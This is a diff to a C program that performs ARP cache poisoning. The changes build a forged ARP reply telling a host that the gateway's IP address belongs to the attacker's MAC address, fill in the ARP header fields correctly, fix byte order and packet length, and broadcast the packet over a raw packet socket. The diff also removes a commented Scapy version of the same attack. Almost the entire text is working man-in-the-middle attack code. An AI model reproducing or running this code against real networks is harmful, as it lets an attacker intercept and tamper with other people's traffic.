@@ -104,25 +104,49 @@ int main(int argc, char *argv[]) {
     }
 
     // --- 2) Poison host: “gw_ip is at atk_mac” (broadcast → host’s cache) ---
+    // assume: buffer points to a chunk at least ETHER_HDR_LEN + ARP_HDR_LEN
+    struct ether_header *eh = (void*)buffer;
+    struct arp_header   *arp= (void*)(buffer + ETHER_HDR_LEN);
+
+    // 1) Build Ethernet header
     unsigned char bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
-    // Ethernet header: broadcast
-    memcpy(eh->ether_shost, atk_mac, ETH_ALEN);
-    memcpy(eh->ether_dhost, bcast,   ETH_ALEN);
+    memcpy(eh->ether_dhost, bcast,    ETH_ALEN);
+    memcpy(eh->ether_shost, atk_mac,  ETH_ALEN);
     eh->ether_type = htons(ETH_P_ARP);
-    // ARP payload: target is host_mac
-    memcpy(arp->arp_sha, host_mac,  ETH_ALEN); /* sender hardware (MAC) address */
-    memcpy(&arp->arp_spa, &gw_ip, sizeof(gw_ip));/* sender protocol (IPv4) address */
-    memcpy(arp->arp_tha, host_mac, ETH_ALEN);/* target hardware (MAC) address */
-    memcpy(&arp->arp_tpa, &host_ip, sizeof(host_ip));/* target protocol (IPv4) address */
 
-    //         arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
-       // sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
-
-    // send
-    memcpy(sa.sll_addr, bcast, ETH_ALEN);
-    if (sendto(sock, buffer, BUF_SIZE, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
-        perror("sendto host");
+    // 2) Build ARP header
+    arp->htype = htons(ARPHRD_ETHER);
+    arp->ptype = htons(ETH_P_IP);
+    arp->hlen  = ETH_ALEN;
+    arp->plen  = 4;
+    arp->oper  = htons(ARPOP_REPLY);
+    memcpy(arp->arp_sha, atk_mac, ETH_ALEN);
+    {
+        uint32_t spa = htonl(gw_ip);
+        memcpy(&arp->arp_spa, &spa, sizeof(spa));
     }
+    memcpy(arp->arp_tha, host_mac, ETH_ALEN);
+    {
+        uint32_t tpa = htonl(host_ip);
+        memcpy(&arp->arp_tpa, &tpa, sizeof(tpa));
+    }
+
+    // 3) Prepare sockaddr_ll
+    struct sockaddr_ll sa = {0};
+    sa.sll_family   = AF_PACKET;
+    sa.sll_protocol = htons(ETH_P_ARP);
+    sa.sll_ifindex  = if_nametoindex(ifname);
+    sa.sll_hatype   = ARPHRD_ETHER;
+    sa.sll_pkttype  = PACKET_BROADCAST;
+    sa.sll_halen    = ETH_ALEN;
+    memcpy(sa.sll_addr, bcast, ETH_ALEN);
+
+    // 4) Send it
+    size_t pkt_len = ETHER_HDR_LEN + ARP_HDR_LEN;
+    if (sendto(sock, buffer, pkt_len, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
+        perror("sendto");
+    }
+
 
     close(sock);
     return EXIT_SUCCESS;
